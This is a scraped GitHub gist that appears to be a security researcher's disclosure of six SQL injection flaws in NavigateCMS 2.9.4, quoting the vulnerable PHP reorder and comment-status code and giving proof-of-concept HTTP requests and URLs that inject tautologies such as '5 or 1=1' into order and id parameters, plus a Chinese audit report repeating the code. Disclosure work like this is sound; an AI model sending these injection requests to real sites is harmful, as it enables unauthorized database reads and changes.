Apr 14, 2017](/NavigateCMS/Navigate-CMS/releases/tag/latest)

## [Packages 0](/users/NavigateCMS/packages?repo_name=Navigate-CMS)

No packages published

## Languages

* [PHP
  68.2%](/NavigateCMS/Navigate-CMS/search?l=php)
* [JavaScript
  21.8%](/NavigateCMS/Navigate-CMS/search?l=javascript)
* [CSS
  6.7%](/NavigateCMS/Navigate-CMS/search?l=css)
* [HTML
  3.2%](/NavigateCMS/Navigate-CMS/search?l=html)
* Other
  0.1%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from gist.github.com_96af2276_20250114_230112.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fed429fed7de46651c89f05e7591fd4fe)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fed429fed7de46651c89f05e7591fd4fe&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fed429fed7de46651c89f05e7591fd4fe) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fed429fed7de46651c89f05e7591fd4fe&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@victomteng1997](https://avatars.githubusercontent.com/u/25191772?s=64&v=4)](/victomteng1997)

# [victomteng1997](/victomteng1997)/**[1\_block\_sql\_injection\_sql\_result.png](/victomteng1997/ed429fed7de46651c89f05e7591fd4fe)**

Last active
July 22, 2021 05:41

Show Gist options

* [Download ZIP](/victomteng1997/ed429fed7de46651c89f05e7591fd4fe/archive/c9b6669763edf2468f5795e9df205579b9144241.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fed429fed7de46651c89f05e7591fd4fe)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fed429fed7de46651c89f05e7591fd4fe)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/victomteng1997/ed429fed7de46651c89f05e7591fd4fe.js&quot;&gt;&lt;/script&gt;
* Save victomteng1997/ed429fed7de46651c89f05e7591fd4fe to your computer and use it in GitHub Desktop.

[Code](/victomteng1997/ed429fed7de46651c89f05e7591fd4fe)
[Revisions
7](/victomteng1997/ed429fed7de46651c89f05e7591fd4fe/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/victomteng1997/ed429fed7de46651c89f05e7591fd4fe.js&quot;&gt;&lt;/script&gt;

Save victomteng1997/ed429fed7de46651c89f05e7591fd4fe to your computer and use it in GitHub Desktop.

[Download ZIP](/victomteng1997/ed429fed7de46651c89f05e7591fd4fe/archive/c9b6669763edf2468f5795e9df205579b9144241.zip)

NavigateCMS CVE

 [Raw](/victomteng1997/ed429fed7de46651c89f05e7591fd4fe/raw/c9b6669763edf2468f5795e9df205579b9144241/1_block_sql_injection_sql_result.png)

[**1\_block\_sql\_injection\_sql\_result.png**](#file-1_block_sql_injection_sql_result-png)

![1_block_sql_injection_sql_result.png](https://gist.github.com/victomteng1997/ed429fed7de46651c89f05e7591fd4fe/raw/c9b6669763edf2468f5795e9df205579b9144241/1_block_sql_injection_sql_result.png)

 [Raw](/victomteng1997/ed429fed7de46651c89f05e7591fd4fe/raw/c9b6669763edf2468f5795e9df205579b9144241/4_products_id.png)

[**4\_products\_id.png**](#file-4_products_id-png)

![4_products_id.png](https://gist.github.com/victomteng1997/ed429fed7de46651c89f05e7591fd4fe/raw/c9b6669763edf2468f5795e9df205579b9144241/4_products_id.png)

 [Raw](/victomteng1997/ed429fed7de46651c89f05e7591fd4fe/raw/c9b6669763edf2468f5795e9df205579b9144241/6_change_comment_status.png)

[**6\_change\_comment\_status.png**](#file-6_change_comment_status-png)

![6_change_comment_status.png](https://gist.github.com/victomteng1997/ed429fed7de46651c89f05e7591fd4fe/raw/c9b6669763edf2468f5795e9df205579b9144241/6_change_comment_status.png)

 [Raw](/victomteng1997/ed429fed7de46651c89f05e7591fd4fe/raw/c9b6669763edf2468f5795e9df205579b9144241/gistfile1.md)

[**gistfile1.md**](#file-gistfile1-md)

# Multiple SQL Injection Vulnerabilities Identified in NavigateCMS

NavigateCMS is a light-weight php CMS.

Official website: <https://www.navigatecms.com/en/home>, <https://github.com/NavigateCMS/Navigate-CMS>

The latest version is v2.9.4 (as to 22nd July, 2021), and the github source code is:

<https://github.com/NavigateCMS/Navigate-CMS/tree/38cacc0d96ea5056d48e613e135a013e26ed53d2>

Credit to: Zhang Zhiyi, Deng Gelei

The following vulnerabilities are tested and verified on 22nd July, 2021.

## Vulnerability 1: block\_order injection

Vulnerable Source Code at `blocks.php`

```
//package/lib/packages/blocks/blocks.php
function run()
{
	global $layout;
	global $DB;
	global $website;

$out = '';
$item = new block();

switch($_REQUEST['act'])
{

	case 'load':
    case 'edit':
	case 2:
		if(!empty($_REQUEST['id']))
		{
			$item->load(intval($_REQUEST['id']));
		}

		if(isset($_REQUEST['form-sent']))
		{
			$item->load_from_post();
			try
			{
                naviforms::check_csrf_token();

				$item->save();
                property::save_properties_from_post('block', $item->id);
				$id = $item->id;

				// set block order
                if(!empty($item->type) && !empty($_REQUEST['blocks-order']))
                {
                    block::reorder($item->type, $_REQUEST['blocks-order'], $_REQUEST['blocks-order-fixed']);//step into
                }
```

which redirects into:

```
//package/lib/packages/blocks/block.class.php
public static function reorder($type, $order, $fixed)
	{
		global $DB;
		global $website;

		$item = explode("#", $order);//explore order by '#'

		for($i=0; $i < count($item); $i++)
		{
			if(empty($item[$i]))
	        {
	            continue;
	        }

	        $block_is_fixed = ($fixed[$item[$i]]=='1'? '1' : '0');

			$ok = $DB->execute('
	            UPDATE nv_blocks
				SET position = '.($i+1).',
				    fixed = '.$block_is_fixed.'
	            WHERE id = '.$item[$i].'// trigger here
				  AND website = '.$website->id
	        );

```

Sample Request to trigger this vulnerability, note the `block-order` form section.

```
POST /navigate/navigate.php?fid=blocks&act=edit&id=7&tab=1 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------195682555912966620871610644291
Content-Length: 7310
Origin: http://localhost
Connection: close
Referer: http://localhost/navigate/navigate.php?fid=blocks&act=edit&id&tab=1
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=vp8rDkw03etQUgHzT9FpieSJ5umQS6ZuLBUE2HnrfYgc4eiNLHWQdPZYVJM6; guest_token=IkpPRWlGeWdObThKVGdTQTdqTFZSdWcxNjA4MjgxNzg4ODE2Ig%3D%3D--acb8c6e71d42560c0d4ce4741531f317312a4f8a; navigate-tinymce-scroll=%7B%7D; navigate-remember-user-id=af59694d7163bd32096f6752379642aee3043fc5; navigate-remember-user-token=9%01%B3%0C%C6%BB%0C%0Bb%D9%18%CB%A1n%CB9a%CF%3E%0Fx%D0Q%EFX%C7C%11%DB%D7S%06B%1B%40+%11L%EB%2A%ABr%E1%EE%D2m%DA%B8%B233%0A%05%A8t%C7%3D%9E%FA%B4%03%C13g1%AF%E1%B4%A6%5C%87%3A%08J%A5%D3%C6%BFVZ%18%A0t%D2%E8GG%8B%AD%BE%BC%25yg%EDh%FB%AFtD%16%81%9D%93y%AD%C5%3AuL%FB%E4%88%B6%B4%F78%E8%D2OIA%11%EE%F1%17cj; navigate-language=en; PHPSESSID=17v9et2fl867j0od9hlvj990ab; NVSID_7a6b5d33_421aa90e079fa326b6494f812ad13e79=17v9et2fl867j0od9hlvj990ab
Upgrade-Insecure-Requests: 1

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="form-sent"

true
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="id"

7
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="_nv_csrf_token"

278f682bb4ecab9f618cd30135cc8bd9569060737a0d0ba57647d648a44258ba
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="type"

social_links
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="date_published"

2021-07-01 00:00
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="date_unpublish"

2021-07-31 00:00
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="access"

0
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="enabled"

1
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="language_selector[]"

en
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="title-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-type-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-image-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-rollover-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-rollover-active-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-video-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-flash-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-order-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-title-en[60f8413c447c4]"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-link-en[60f8413c447c4]"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-access-en[60f8413c447c4]"

0
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-title-en[60f8413c447ec]"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-link-en[60f8413c447ec]"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-access-en[60f8413c447ec]"

0
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-html-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-content-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="action-type-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="action-web-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="action-javascript-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="action-file-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="action-image-en"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="title-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-type-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-image-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-rollover-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-rollover-active-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-video-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-flash-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-order-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-title-es[60f8413c44ae7]"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-link-es[60f8413c44ae7]"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-access-es[60f8413c44ae7]"

0
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-title-es[60f8413c44b19]"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-link-es[60f8413c44b19]"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-links-table-access-es[60f8413c44b19]"

0
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-html-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="trigger-content-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="action-type-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="action-web-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="action-javascript-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="action-file-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="action-image-es"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="all_categories[]"

1
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="categories"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="exclusions"

-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="elements_display[]"

all
-----------------------------195682555912966620871610644291
Content-Disposition: form-data; name="blocks-order"

5 or 1=1
-----------------------------195682555912966620871610644291--

```

Resulted SQL query at backend:

[![1_block_sql_injection_sql_result](1_block_sql_injection_sql_result.png)](1_block_sql_injection_sql_result.png)

## Vulnerability 2: id at change publish status:

Injection parameter `id` at `item.php`

```
//package/lib/packages/items/items.php
function run()
{
	global $layout;
	global $DB;
	global $website;
	global $theme;
	global $user;

	$out = '';
	$item = new item();

	switch($_REQUEST['act'])
	{

		case "change_comment_status": // change comment status
			if(empty($_REQUEST['id']))
			{
				echo "false";
				core_terminate();
			}

			switch($_REQUEST['opt'])
			{
				case 'publish':
					$DB->execute('
						UPDATE nv_comments
						   SET status = 0
						 WHERE website = '.$website->id.' AND
						       id = '.$_REQUEST['id']);
					break;

				case 'unpublish':
					$DB->execute('
						UPDATE nv_comments
						   SET status = 1
						 WHERE website = '.$website->id.' AND
						       id = '.$_REQUEST['id']);
					break;

				case 'delete':
					$DB->execute('
						DELETE FROM nv_comments
						 WHERE website = '.$website->id.' AND
							   id = '.$_REQUEST['id']);
					break;
			}
```

Attacker can use the following traffic to trigger the vulnerability

```
GET /navigate/navigate.php?fid=items&act=change_comment_status&id=abc%20or%201=1&opt=publish HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=vp8rDkw03etQUgHzT9FpieSJ5umQS6ZuLBUE2HnrfYgc4eiNLHWQdPZYVJM6; guest_token=IkpPRWlGeWdObThKVGdTQTdqTFZSdWcxNjA4MjgxNzg4ODE2Ig%3D%3D--acb8c6e71d42560c0d4ce4741531f317312a4f8a; navigate-tinymce-scroll=%7B%7D; navigate-remember-user-id=af59694d7163bd32096f6752379642aee3043fc5; navigate-remember-user-token=9%01%B3%0C%C6%BB%0C%0Bb%D9%18%CB%A1n%CB9a%CF%3E%0Fx%D0Q%EFX%C7C%11%DB%D7S%06B%1B%40+%11L%EB%2A%ABr%E1%EE%D2m%DA%B8%B233%0A%05%A8t%C7%3D%9E%FA%B4%03%C13g1%AF%E1%B4%A6%5C%87%3A%08J%A5%D3%C6%BFVZ%18%A0t%D2%E8GG%8B%AD%BE%BC%25yg%EDh%FB%AFtD%16%81%9D%93y%AD%C5%3AuL%FB%E4%88%B6%B4%F78%E8%D2OIA%11%EE%F1%17cj; navigate-language=en; PHPSESSID=17v9et2fl867j0od9hlvj990ab; NVSID_7a6b5d33_421aa90e079fa326b6494f812ad13e79=17v9et2fl867j0od9hlvj990ab
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

```

Resulted query log at backend:

[![v2_change_item_status_id](v2_change_item_status_id.png)](v2_change_item_status_id.png)

## Vulnerability 3: product reorder function

Injection parameter `products-order` at `products.php`

```
//package/lib/packages/products/products.php
function run()
{
	global $layout;
	global $DB;
	global $website;
	global $theme;
	global $user;

	$out = '';
	$item = new product();

	switch($_REQUEST['act'])
	{
        case 'products_order':
            if(!empty($_POST['products-order']))
            {
                if(naviforms::check_csrf_token('header'))
                {
                    // save new order
                    $response = product::reorder($_POST['products-order']);
                    if($response!==true)
                    {
                        echo $response['error'];
                    }
                    else
                    {
                        echo 'true';
                    }
                }
            }
```

which steps into

```
//package/lib/packages/products/product.class.php
    public static function reorder($order)
    {
        global $DB;
		global $website;

		$items = explode("#", $order);

		for($i=0; $i < count($items); $i++)
		{
			if(empty($items[$i]))
            {
                continue;
            }

			$ok = $DB->execute('
              UPDATE nv_products
				 SET position = '.($i+1).'
			   WHERE id = '.$items[$i].' AND
			         website = '.$website->id
            );
```

Clearly it's the same vulnerability as before, where `id` parameter is not filtered.

## Vulnerability 4: product id

injection param `id`  at `products.php`. Same root cause (`id` not filtered)

```
//package/lib/packages/products/products.php
        case "change_comment_status":
			if(empty($_REQUEST['id']))
			{
				echo "false";
				core_terminate();
			}

			switch($_REQUEST['opt'])
			{
				case 'publish':
					$DB->execute('
						UPDATE nv_comments
						   SET status = 0
						 WHERE website = '.$website->id.' AND
						       id = '.$_REQUEST['id']);
					break;

				case 'unpublish':
					$DB->execute('
						UPDATE nv_comments
						   SET status = 1
						 WHERE website = '.$website->id.' AND
						       id = '.$_REQUEST['id']);
					break;

				case 'delete':
					$DB->execute('
						DELETE FROM nv_comments
						 WHERE website = '.$website->id.' AND
							   id = '.$_REQUEST['id']);
					break;
			}
```

Attacker can navigate to the following url to trigger a vulnerability

```
http://localhost/navigate/navigate.php?fid=products&act=change_comment_status&id=1%20or%201=1;&opt=publish

```

which results in backend query:

[![4_products_id](4_products_id.png)](4_products_id.png)

## Vulnerability 5: Template Id injection

Vulnerable source code:

`injection param` template-properties-order` at templates.php

```
//package/lib/packages/templates/templates.php
		case 'load':
		case 2: // edit/new form
			if(!empty($_REQUEST['id']))
			{
                if(is_numeric($_REQUEST['id']))
                {
                    $item->load(intval($_REQUEST['id']));
                }
                else
                {
                    $item->load_from_theme($_REQUEST['id']);
                }
			}

			if(isset($_REQUEST['form-sent']))
			{
				try
				{
                    $item->load_from_post();
                    naviforms::check_csrf_token();

					$item->save();
					if(!empty($_REQUEST['property-enabled']))
                    {
                        $enableds = array_values($_REQUEST['property-enabled']);
                    }
					else
                    {
                        $enableds = array();
                    }
					property::reorder("template", $item->id, $_REQUEST['template-properties-order'], $enableds);
```

which steps into `property.class.php`

```
//package/lib/packages/properties/property.class.php
	public static function reorder($element, $template, $order, $enableds=NULL)
	{
		global $DB;
		global $website;

		$item = explode("#", $order);

		for($i=0; $i < count($item); $i++)
		{
			if(empty($item[$i])) continue;

			$enabled = '';
			if(is_array($enableds))
			{
				$enabled = ', enabled = 0 ';
				for($e=0; $e < count($enableds); $e++)
				{
					if($enableds[$e]==$item[$i]) $enabled = ', enabled = 1 ';
				}
			}

			$ok =	$DB->execute('
                UPDATE nv_properties
				   SET position = '.($i+1).' '.$enabled.'
				 WHERE id = '.$item[$i].'
				   AND website = '.$website->id
            );
```

Similar coding style as previous vulns, `item` parameter is not filtered and attacker can inject on `id`.

## Vulnerability 6: children\_id at structure.php injection

injection param `children_order` at `structure.php`

```
//package/lib/packages/structure/structure.php
		case "reorder":
			$ok = structure::reorder($_REQUEST['parent'], $_REQUEST['children_order']);
			echo json_encode($ok);
			core_terminate();
			break;
```

which steps into:

```
//package/lib/packages/structure/structure.class.php
	public static function reorder($parent, $children)
	{
		global $DB;
		global $website;

		$children = explode("#", $children);

		for($i=0; $i < count($children); $i++)
		{
			if(empty($children[$i]))
            {
                continue;
            }

			$ok =	$DB->execute('UPDATE nv_structure
									 SET position = '.($i+1).'
								   WHERE id = '.$children[$i].'
									 AND parent = '.intval($parent).'
									 AND website = '.$website->id);

			if(!$ok)
            {
                return array("error" => $DB->get_last_error());
            }
		}

		return true;
	}
```

Attacker can easily navigate to url like:
<http://localhost/navigate/navigate.php?fid=structure&act=reorder&parent=1&children=abc%20or%201=1>
which results in the following sql query at backend.

[![6_change_comment_status](6_change_comment_status.png)](6_change_comment_status.png)

 [Raw](/victomteng1997/ed429fed7de46651c89f05e7591fd4fe/raw/c9b6669763edf2468f5795e9df205579b9144241/navigate.md)

[**navigate.md**](#file-navigate-md)

## NavigateCMS 审计报告

软件版本： navigate-2.9.4r1561(202107)

官方网站：<https://www.navigatecms.com/en/home>

### 1. SQL injection

injection param |blocks-order|

```
//package/lib/packages/blocks/blocks.php
function run()
{
	global $layout;
	global $DB;
	global $website;

	$out = '';
	$item = new block();

	switch($_REQUEST['act'])
	{

		case 'load':
        case 'edit':
		case 2:
			if(!empty($_REQUEST['id']))
			{
				$item->load(intval($_REQUEST['id']));
			}

			if(isset($_REQUEST['form-sent']))
			{
				$item->load_from_post();
				try
				{
                    naviforms::check_csrf_token();

					$item->save();
                    property::save_properties_from_post('block', $item->id);
					$id = $item->id;

					// set block order
                    if(!empty($item->type) && !empty($_REQUEST['blocks-order']))
                    {
                        block::reorder($item->type, $_REQUEST['blocks-order'], $_REQUEST['blocks-order-fixed']);//step into
                    }
```

```
//package/lib/packages/blocks/block.class.php
public static function reorder($type, $order, $fixed)
	{
		global $DB;
		global $website;

		$item = explode("#", $order);//explore order by '#'

		for($i=0; $i < count($item); $i++)
		{
			if(empty($item[$i]))
            {
                continue;
            }

            $block_is_fixed = ($fixed[$item[$i]]=='1'? '1' : '0');

			$ok = $DB->execute('
                UPDATE nv_blocks
				SET position = '.($i+1).',
				    fixed = '.$block_is_fixed.'
                WHERE id = '.$item[$i].'// trigger here
				  AND website = '.$website->id
            );
```

### 2. SQL injection

injection param |id|

```
//package/lib/packages/items/items.php
function run()
{
	global $layout;
	global $DB;
	global $website;
	global $theme;
	global $user;

	$out = '';
	$item = new item();

	switch($_REQUEST['act'])
	{

		case "change_comment_status": // change comment status
			if(empty($_REQUEST['id']))
			{
				echo "false";
				core_terminate();
			}

			switch($_REQUEST['opt'])
			{
				case 'publish':
					$DB->execute('
						UPDATE nv_comments
						   SET status = 0
						 WHERE website = '.$website->id.' AND
						       id = '.$_REQUEST['id']);
					break;

				case 'unpublish':
					$DB->execute('
						UPDATE nv_comments
						   SET status = 1
						 WHERE website = '.$website->id.' AND
						       id = '.$_REQUEST['id']);
					break;

				case 'delete':
					$DB->execute('
						DELETE FROM nv_comments
						 WHERE website = '.$website->id.' AND
							   id = '.$_REQUEST['id']);
					break;
			}
```

### 3. SQL injection

injection param |products-order|

```
//package/lib/packages/products/products.php
function run()
{
	global $layout;
	global $DB;
	global $website;
	global $theme;
	global $user;

	$out = '';
	$item = new product();

	switch($_REQUEST['act'])
	{
        case 'products_order':
            if(!empty($_POST['products-order']))
            {
                if(naviforms::check_csrf_token('header'))
                {
                    // save new order
                    $response = product::reorder($_POST['products-order']);
                    if($response!==true)
                    {
                        echo $response['error'];
                    }
                    else
                    {
                        echo 'true';
                    }
                }
            }
```

```
//package/lib/packages/products/product.class.php
    public static function reorder($order)
    {
        global $DB;
		global $website;

		$items = explode("#", $order);

		for($i=0; $i < count($items); $i++)
		{
			if(empty($items[$i]))
            {
                continue;
            }

			$ok = $DB->execute('
              UPDATE nv_products
				 SET position = '.($i+1).'
			   WHERE id = '.$items[$i].' AND
			         website = '.$website->id
            );
```

### 4. SQL injection

injection param |id|

```
//package/lib/packages/products/products.php
        case "change_comment_status":
			if(empty($_REQUEST['id']))
			{
				echo "false";
				core_terminate();
			}

			switch($_REQUEST['opt'])
			{
				case 'publish':
					$DB->execute('
						UPDATE nv_comments
						   SET status = 0
						 WHERE website = '.$website->id.' AND
						       id = '.$_REQUEST['id']);
					break;

				case 'unpublish':
					$DB->execute('
						UPDATE nv_comments
						   SET status = 1
						 WHERE website = '.$website->id.' AND
						       id = '.$_REQUEST['id']);
					break;

				case 'delete':
					$DB->execute('
						DELETE FROM nv_comments
						 WHERE website = '.$website->id.' AND
							   id = '.$_REQUEST['id']);
					break;
			}
```

### 5. SQL injection

injection param |template-properties-order|

```
//package/lib/packages/templates/templates.php
		case 'load':
		case 2: // edit/new form
			if(!empty($_REQUEST['id']))
			{
                if(is_numeric($_REQUEST['id']))
                {
                    $item->load(intval($_REQUEST['id']));
                }
                else
                {
                    $item->load_from_theme($_REQUEST['id']);
                }
			}

			if(isset($_REQUEST['form-sent']))
			{
				try
				{
                    $item->load_from_post();
                    naviforms::check_csrf_token();

					$item->save();
					if(!empty($_REQUEST['property-enabled']))
                    {
                        $enableds = array_values($_REQUEST['property-enabled']);
                    }
					else
                    {
                        $enableds = array();
                    }
					property::reorder("template", $item->id, $_REQUEST['template-properties-order'], $enableds);
```

```
//package/lib/packages/properties/property.class.php
	public static function reorder($element, $template, $order, $enableds=NULL)
	{
		global $DB;
		global $website;

		$item = explode("#", $order);

		for($i=0; $i < count($item); $i++)
		{
			if(empty($item[$i])) continue;

			$enabled = '';
			if(is_array($enableds))
			{
				$enabled = ', enabled = 0 ';
				for($e=0; $e < count($enableds); $e++)
				{
					if($enableds[$e]==$item[$i]) $enabled = ', enabled = 1 ';
				}
			}

			$ok =	$DB->execute('
                UPDATE nv_properties
				   SET position = '.($i+1).' '.$enabled.'
				 WHERE id = '.$item[$i].'
				   AND website = '.$website->id
            );
```

### 6. SQL injection

injection param |children\_order|

```
//package/lib/packages/structure/structure.php
		case "reorder":
			$ok = structure::reorder($_REQUEST['parent'], $_REQUEST['children_order']);
			echo json_encode($ok);
			core_terminate();
			break;
```

```
//package/lib/packages/structure/structure.class.php
	public static function reorder($parent, $children)
	{
		global $DB;
		global $website;

		$children = explode("#", $children);

		for($i=0; $i < count($children); $i++)
		{
			if(empty($children[$i]))
            {
                continue;
            }

			$ok =	$DB->execute('UPDATE nv_structure
									 SET position = '.($i+1).'
								   WHERE id = '.$children[$i].'
									 AND parent = '.intval($parent).'
									 AND website = '.$website->id);

			if(!$ok)
            {
                return array("error" => $DB->get_last_error());
            }
		}

		return true;
	}
```

 [Raw](/victomteng1997/ed429fed7de46651c89f05e7591fd4fe/raw/c9b6669763edf2468f5795e9df205579b9144241/v2_change_item_status_id.png)

[**v2\_change\_item\_status\_id.png**](#file-v2_change_item_status_id-png)

![v2_change_item_status_id.png](https://gist.github.com/victomteng1997/ed429fed7de46651c89f05e7591fd4fe/raw/c9b6669763edf2468f5795e9df205579b9144241/v2_change_item_status_id.png)

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fed429fed7de46651c89f05e7591fd4fe)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


